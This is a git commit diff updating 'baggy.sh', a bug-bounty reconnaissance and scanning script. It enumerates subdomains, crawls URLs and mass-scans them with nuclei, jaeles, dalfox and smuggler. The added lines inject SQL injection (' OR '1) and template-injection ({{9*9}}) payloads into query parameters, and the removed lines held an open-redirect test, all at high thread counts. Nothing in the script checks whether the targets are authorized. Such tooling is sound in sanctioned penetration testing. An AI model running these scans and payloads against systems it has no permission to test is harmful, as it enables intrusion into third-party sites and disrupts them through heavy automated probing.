b44fbbcea897ac3872c1af6cead39c7807b3defb
Sherwyn Moodley <forshish@gmail.com>
2020-11-05 06:16:05 -0500

    Update baggy.sh
    Revised script , possibly more accurate

--- baggy.sh
+++ baggy.sh
@@ -7,46 +7,47 @@ echo '______________________________________________________________________'
 echo  "${red} Performing : ${green} Asset Finder ${reset}"
 echo '----------------------------------------------------------------------'
 cat scope.txt | while read line; do ~/go/bin/assetfinder -subs-only $line | tee -a assets; done
-cat assets | ~/go/bin/httprobe | tee hosts
-cat assets | while read line; do python3 ~/waybackMachine/waybackMachine.py $line | tee -a wayback; done
-cat assets hosts wayback | sort -u | tee final_urls
 clear
-echo '----------------------------------------------------------------------'
-echo  "${red} Performing : ${green} LFI ${reset}"
-echo '----------------------------------------------------------------------'
-~/go/bin/gf lfi  final_urls | sort -u > lfi
-cat lfi | ~/go/bin/anew | xargs -I@ ~/go/bin/jaeles scan -c 100 -s /tmp/jaeles-signatures/fuzz/lfi -u @ 
-cat lfi | ~/go/bin/nuclei -t ~/nuclei-templates/vulnerabilities/moodle-filter-jmol-lfi.yaml -o lfi_tested
 clear
+echo '______________________________________________________________________'
+echo  "${red} Performing : ${green} Host Discovery ${reset}"
 echo '----------------------------------------------------------------------'
-echo  "${red} Performing : ${green} REDIRECT TESTING ${reset}"
-echo '----------------------------------------------------------------------'
-~/go/bin/gf redirect final_urls | sort -u > redirect
-cat redirect | ~/go/bin/anew | xargs -I@ ~/go/bin/jaeles scan -c 100 -s /tmp/jaeles-signatures/fuzz/open-redirect/ -u @ 
-export LHOST=$(curl ifconfig.me)
-cat redirect | ~/go/bin/qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"' | tee openredirect.txt
+cat assets | ~/go/bin/httprobe -prefer-https | tee hosts
 clear
+echo '______________________________________________________________________'
+echo  "${red} Performing : ${green} Urls Gathering ${reset}"
 echo '----------------------------------------------------------------------'
-echo  "${red} Performing : ${green} CRLF TESTING ${reset}"
-echo '----------------------------------------------------------------------'
-cat final_urls | ~/go/bin/nuclei -t ~/nuclei-templates/vulnerabilities/crlf-injection.yaml -o crlf_tested
+cat hosts | sort -u | ~/go/bin/gau | egrep -iv ".(jpg|gif|css|png|woff|pdf|svg|js)" | tee gau
+cat hosts | sort -u | while read line; do ~/go/bin/gospider -d 0 -s "$line" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | ~/go/bin/anew | tee -a spider; done
+cat gau spider | sort -u | tee -a urls
 clear
+echo '______________________________________________________________________'
+echo  "${red} Performing : ${green} GF Sorting ${reset}"
 echo '----------------------------------------------------------------------'
+mkdir gfsort
+gf --list | while read line; do cat gau | ~/go/bin/gf $line | tee gfsort/$line; done
+echo '______________________________________________________________________'
+echo  "${red} Performing : ${green} Nuclei and Jaeles Testing per GF ${reset}"
+echo '----------------------------------------------------------------------'
+echo --------------------------------LFI------------------------------------
+cat gfsort/lfi | xargs -I@ ~/go/bin/jaeles scan -c 100 -s ~/jaeles-signatures/fuzz/lfi -u @
+cat gfsort/lfi | ~/go/bin/nuclei -t ~/nuclei-templates/fuzzing/ -pbar -o LFI.txt
+echo --------------------------------SSTI-----------------------------------
+cat gfsort/ssti | xargs -I@ ~/go/bin/jaeles scan -c 100 -s ~/jaeles-signatures/fuzz/ssti -u @
+cat gfsort/ssti | ~/go/bin/qsreplace "SSTI{{9*9}}"  | ~/go/bin/httpx -match-regex 'SSTI81' -threads 300 | tee SSTI.txt
+echo --------------------------------OPEN REDIRECT--------------------------
+cat gfsort/redirect | xargs -I@ ~/go/bin/jaeles scan -c 100 -s ~/jaeles-signatures/fuzz/open-redirect -u @
+echo --------------------------------CVEs--------------------------
+cat gfsort/interesting* | sort -u | ~/go/bin/nuclei -t ~/nuclei-templates/cves. -pbar -o CVEs.txt
+echo --------------------------------SQLi--------------------------
+cat gfsort/sqli | qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n" | tee -a SQLi.txt
+clear
+echo '______________________________________________________________________'
+echo  "${red} Performing : ${green} SMUGGLER ${reset}"
+echo '----------------------------------------------------------------------'
+cat hosts | sort -u | python3 ~/smuggler/smuggler.py -t 4 -q
+clear
+echo '______________________________________________________________________'
 echo  "${red} Performing : ${green} XSS ${reset}"
 echo '----------------------------------------------------------------------'
-~/go/bin/gf xss final_urls | cut -d : -f3- | sort -u > xss
-cat xss | ~/go/bin/nuclei -c 200 -silent -t ~/nuclei-templates/generic-detections/basic-xss-prober.yaml | tee -a xss_nuclei
-cat xss | ~/go/bin/nuclei -c 200 -silent -t ~/nuclei-templates/generic-detections/top-15-xss.yaml | tee -a xss_nuclei
-cat xss | grep '=' | ~/go/bin/qsreplace a | ~/go/bin/dalfox pipe --silence -b -o dalfox.txt
-clear
-echo '----------------------------------------------------------------------'
-echo  "${red} Performing : ${green} RCE ${reset}"
-echo '----------------------------------------------------------------------'
-~/go/bin/gf rce  final_urls | sort -u > rce
-cat rce | ~/go/bin/anew | xargs -I@ ~/go/bin/jaeles scan -c 100 -s /tmp/jaeles-signatures/cves/ -u @ 
-echo '______________________________________________________________________'
-echo  "${red} Performing : ${green} CVEs ${reset}"
-echo '----------------------------------------------------------------------'
-cat final_urls | ~/go/bin/nuclei -c 200 -pbar -t ~/nuclei-templates/ -o nuclei_output
-cat final_urls | ~/go/bin/anew | xargs -I@ ~/go/bin/jaeles scan -c 100 -s /tmp/jaeles-signatures/ -u @ 
-
+cat gfsort/xss | ~/go/bin/kxss | ~/go/bin/dalfox pipe
